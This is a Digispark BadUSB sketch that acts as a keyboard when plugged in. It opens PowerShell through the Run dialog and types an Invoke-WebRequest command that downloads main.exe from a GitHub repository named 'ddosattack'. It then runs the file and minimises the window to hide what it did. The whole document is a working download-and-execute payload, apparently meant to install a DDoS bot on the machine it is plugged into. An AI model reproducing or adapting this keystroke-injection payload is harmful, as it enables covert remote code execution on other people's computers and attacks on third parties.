#include <DigiKeyboard.h>

void setup() {
  DigiKeyboard.sendKeyStroke(0);
  DigiKeyboard.sendKeyStroke(KEY_R, MOD_GUI_LEFT);
  DigiKeyboard.delay(200);
  DigiKeyboard.print("powershell");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(500);
  DigiKeyboard.print("Invoke/WebRequest /Uri https>&&raw.githubusercontent.com&Fred/the/bot&ddosattack&master&main.exe /OutFile .");
  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT); // sends a \
  DigiKeyboard.print("main.exe< .");
  DigiKeyboard.sendKeyStroke(0x64,MOD_ALT_RIGHT);
  DigiKeyboard.print("main.exe");
  DigiKeyboard.sendKeyStroke(KEY_ENTER);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_SPACE, MOD_ALT_LEFT);
  DigiKeyboard.delay(10);
  DigiKeyboard.sendKeyStroke(KEY_I);
}

void loop() {

}
